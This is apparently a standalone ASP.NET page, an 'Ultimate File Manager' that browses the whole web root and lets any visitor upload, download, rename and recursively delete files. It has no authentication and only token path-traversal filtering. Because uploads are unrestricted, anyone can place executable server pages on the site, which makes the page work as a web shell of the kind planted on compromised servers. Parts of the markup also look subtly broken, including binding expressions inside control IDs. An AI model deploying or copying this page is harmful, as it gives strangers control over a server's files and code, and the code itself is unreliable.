<%@ Page Language="C#" AutoEventWireup="true" %>
<!DOCTYPE html>
<html>
<head>
    <title>Ultimate File Manager - Full Server Navigation</title>
    <style>
        body { font-family: Arial; padding: 20px; background: #f9f9f9; color: #333; }
        .breadcrumb a { text-decoration:none; color:#0066cc; margin-right:5px; }
        .breadcrumb a:hover { text-decoration: underline; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; }
        th, td { border: 1px solid #ddd; padding: 8px; }
        th { background: #eee; }
        input[type=text] { width: 90%; padding: 3px; }
        .actions button { margin-right: 5px; }
        .upload-section, .folder-create { margin-top: 10px; margin-bottom: 15px; }
        .preview { margin-top: 15px; padding: 10px; background: #fff; border: 1px solid #ccc; max-height: 300px; overflow:auto; }
        img.preview-img { max-width: 100%; max-height: 280px; }
        @media (max-width: 600px) {
            table, th, td { font-size: 14px; }
        }
    </style>
</head>
<body>
    <h2>Ultimate File Manager - Full Server Navigation</h2>

    <asp:Literal ID="ltBreadcrumb" runat="server"></asp:Literal>

    <form id="form1" runat="server" enctype="multipart/form-data">

        <div class="upload-section">
            <asp:FileUpload ID="fuUpload" runat="server" />
            <asp:Button ID="btnUpload" runat="server" Text="Upload File" OnClick="btnUpload_Click" />
        </div>

        <div class="folder-create">
            <asp:TextBox ID="txtNewFolder" runat="server" Placeholder="New Folder Name"></asp:TextBox>
            <asp:Button ID="btnCreateFolder" runat="server" Text="Create Folder" OnClick="btnCreateFolder_Click" />
        </div>

        <asp:Label ID="lblMessage" runat="server" ForeColor="Green"></asp:Label>
        <asp:Label ID="lblError" runat="server" ForeColor="Red"></asp:Label>

        <asp:HiddenField ID="hfCurrentPath" runat="server" />

        <asp:Repeater ID="rptFiles" runat="server">
            <HeaderTemplate>
                <table>
                    <tr>
                        <th>Name</th>
                        <th>Type</th>
                        <th>Size (KB)</th>
                        <th>Actions</th>
                    </tr>
            </HeaderTemplate>
            <ItemTemplate>
                <tr>
                    <td>
                        <%# Eval("IsDirectory") ? 
                            ("<a href='?path=" + Eval("RelativePath") + "'>" + Eval("Name") + "</a>") : 
                            Eval("Name") %>
                    </td>
                    <td><%# Eval("IsDirectory") ? "Folder" : "File" %></td>
                    <td><%# Eval("IsDirectory") ? "-" : (Math.Round(Convert.ToDouble(Eval("Size")) / 1024, 2).ToString()) %></td>
                    <td class="actions">
                        <% if (!(bool)Eval("IsDirectory")) { %>
                            <asp:Button ID="btnDownload_<%# Container.ItemIndex %>" runat="server" Text="Download" CommandArgument='<%# Eval("RelativePath") %>' OnClick="btnDownload_Click" />
                        <% } %>
                        <asp:Button ID="btnDelete_<%# Container.ItemIndex %>" runat="server" Text="Delete" CommandArgument='<%# Eval("RelativePath") %>' OnClick="btnDelete_Click" OnClientClick="return confirm('Are you sure?');" />
                        <asp:TextBox ID="txtRename_<%# Container.ItemIndex %>" runat="server" Text='<%# Eval("Name") %>' Width="120px" />
                        <asp:Button ID="btnRename_<%# Container.ItemIndex %>" runat="server" Text="Rename" CommandArgument='<%# Eval("RelativePath") %>' OnClick="btnRename_Click" />
                    </td>
                </tr>
            </ItemTemplate>
            <FooterTemplate>
                </table>
            </FooterTemplate>
        </asp:Repeater>

    </form>

<script runat="server">

    string RootPath;
    string CurrentPath;
    string CurrentPhysicalPath;

    protected void Page_Load(object sender, EventArgs e)
    {
        // Server root folder set as RootPath
        RootPath = Server.MapPath("/");

        string requestedPath = Request.QueryString["path"];
        if (!IsPostBack)
        {
            if (string.IsNullOrEmpty(requestedPath))
                CurrentPath = "";
            else
            {
                requestedPath = requestedPath.Replace("..", ""); // Simple security
                CurrentPath = requestedPath;
            }
            hfCurrentPath.Value = CurrentPath;
            BuildBreadcrumb();
            LoadFilesAndFolders();
        }
        else
        {
            CurrentPath = hfCurrentPath.Value;
        }
    }

    void BuildBreadcrumb()
    {
        var parts = CurrentPath.Split(new char[] { '/', '\\' }, StringSplitOptions.RemoveEmptyEntries);
        string pathAccumulate = "";
        System.Text.StringBuilder sb = new System.Text.StringBuilder();
        sb.Append("<div class='breadcrumb'>");
        sb.Append("<a href='?path='>Root</a>");

        for (int i = 0; i < parts.Length; i++)
        {
            pathAccumulate += (pathAccumulate == "" ? "" : "/") + parts[i];
            sb.Append(" / <a href='?path=" + pathAccumulate + "'>" + parts[i] + "</a>");
        }
        sb.Append("</div>");
        ltBreadcrumb.Text = sb.ToString();
    }

    void LoadFilesAndFolders()
    {
        CurrentPhysicalPath = System.IO.Path.Combine(RootPath, CurrentPath.Replace("/", "\\"));

        // Security check: prevent going outside RootPath
        if (!CurrentPhysicalPath.StartsWith(RootPath))
        {
            CurrentPhysicalPath = RootPath;
            CurrentPath = "";
        }

        var items = new System.Collections.Generic.List<FileItem>();

        // Add Parent folder if not root
        if (!string.IsNullOrEmpty(CurrentPath))
        {
            string parentPath = System.IO.Path.GetDirectoryName(CurrentPath.Replace("/", "\\")).Replace("\\", "/");
            items.Add(new FileItem { Name = ".. (Parent Folder)", RelativePath = parentPath, IsDirectory = true, Size = 0, IsParent = true });
        }

        // Directories
        foreach (var dir in System.IO.Directory.GetDirectories(CurrentPhysicalPath))
        {
            var di = new System.IO.DirectoryInfo(dir);
            string relative = GetRelativePath(dir);
            items.Add(new FileItem
            {
                Name = di.Name,
                RelativePath = relative,
                IsDirectory = true,
                Size = 0
            });
        }

        // Files
        foreach (var file in System.IO.Directory.GetFiles(CurrentPhysicalPath))
        {
            var fi = new System.IO.FileInfo(file);
            string relative = GetRelativePath(file);
            items.Add(new FileItem
            {
                Name = fi.Name,
                RelativePath = relative,
                IsDirectory = false,
                Size = fi.Length
            });
        }

        rptFiles.DataSource = items;
        rptFiles.DataBind();

        lblMessage.Text = "";
        lblError.Text = "";
    }

    string GetRelativePath(string fullPath)
    {
        if (fullPath.StartsWith(RootPath))
            return fullPath.Substring(RootPath.Length).TrimStart('\\').Replace("\\", "/");
        return fullPath;
    }

    protected void btnUpload_Click(object sender, EventArgs e)
    {
        lblMessage.Text = "";
        lblError.Text = "";

        if (fuUpload.HasFile)
        {
            try
            {
                string fileName = System.IO.Path.GetFileName(fuUpload.FileName);
                string savePath = System.IO.Path.Combine(CurrentPhysicalPath, fileName);

                if (System.IO.File.Exists(savePath))
                {
                    lblError.Text = "File already exists.";
                    return;
                }

                fuUpload.SaveAs(savePath);
                lblMessage.Text = "File uploaded successfully.";
                LoadFilesAndFolders();
            }
            catch (Exception ex)
            {
                lblError.Text = "Upload failed: " + ex.Message;
            }
        }
        else
        {
            lblError.Text = "No file selected.";
        }
    }

    protected void btnCreateFolder_Click(object sender, EventArgs e)
    {
        lblMessage.Text = "";
        lblError.Text = "";

        string newFolderName = txtNewFolder.Text.Trim();
        if (string.IsNullOrEmpty(newFolderName))
        {
            lblError.Text = "Folder name cannot be empty.";
            return;
        }

        string newFolderPath = System.IO.Path.Combine(CurrentPhysicalPath, newFolderName);
        if (System.IO.Directory.Exists(newFolderPath))
        {
            lblError.Text = "Folder already exists.";
            return;
        }

        try
        {
            System.IO.Directory.CreateDirectory(newFolderPath);
            lblMessage.Text = "Folder created successfully.";
            txtNewFolder.Text = "";
            LoadFilesAndFolders();
        }
        catch (Exception ex)
        {
            lblError.Text = "Failed to create folder: " + ex.Message;
        }
    }

    protected void btnDelete_Click(object sender, EventArgs e)
    {
        var btn = (System.Web.UI.WebControls.Button)sender;
        string relativePath = btn.CommandArgument;
        string fullPath = System.IO.Path.Combine(RootPath, relativePath.Replace("/", "\\"));

        try
        {
            if (System.IO.Directory.Exists(fullPath))
                System.IO.Directory.Delete(fullPath, true);
            else if (System.IO.File.Exists(fullPath))
                System.IO.File.Delete(fullPath);

            lblMessage.Text = "Deleted successfully.";
            LoadFilesAndFolders();
        }
        catch (Exception ex)
        {
            lblError.Text = "Delete failed: " + ex.Message;
        }
    }

    protected void btnRename_Click(object sender, EventArgs e)
    {
        var btn = (System.Web.UI.WebControls.Button)sender;
        string oldRelativePath = btn.CommandArgument;

        var item = rptFiles.Items[btn.NamingContainer.ItemIndex];
        var txtRename = (System.Web.UI.WebControls.TextBox)item.FindControl("txtRename_" + btn.NamingContainer.ItemIndex);

        if (txtRename == null)
            return;

        string newName = txtRename.Text.Trim();
        if (string.IsNullOrEmpty(newName))
        {
            lblError.Text = "Name cannot be empty.";
            return;
        }

        string oldFullPath = System.IO.Path.Combine(RootPath, oldRelativePath.Replace("/", "\\"));
        string newFullPath = System.IO.Path.Combine(System.IO.Path.GetDirectoryName(oldFullPath), newName);

        try
        {
            if (System.IO.File.Exists(newFullPath) || System.IO.Directory.Exists(newFullPath))
            {
                lblError.Text = "A file or folder with that name already exists.";
                return;
            }

            if (System.IO.Directory.Exists(oldFullPath))
                System.IO.Directory.Move(oldFullPath, newFullPath);
            else if (System.IO.File.Exists(oldFullPath))
                System.IO.File.Move(oldFullPath, newFullPath);

            lblMessage.Text = "Renamed successfully.";
            LoadFilesAndFolders();
        }
        catch (Exception ex)
        {
            lblError.Text = "Rename failed: " + ex.Message;
        }
    }

    protected void btnDownload_Click(object sender, EventArgs e)
    {
        var btn = (System.Web.UI.WebControls.Button)sender;
        string relativePath = btn.CommandArgument;
        string fullPath = System.IO.Path.Combine(RootPath, relativePath.Replace("/", "\\"));

        if (System.IO.File.Exists(fullPath))
        {
            Response.Clear();
            Response.ContentType = "application/octet-stream";
            Response.AppendHeader("Content-Disposition", "attachment; filename=" + System.IO.Path.GetFileName(fullPath));
            Response.TransmitFile(fullPath);
            Response.End();
        }
        else
        {
            lblError.Text = "File not found.";
        }
    }

    class FileItem
    {
        public string Name { get; set; }
        public string RelativePath { get; set; }
        public bool IsDirectory { get; set; }
        public long Size { get; set; }
        public bool IsParent { get; set; }
    }

</script>
</body>
</html>
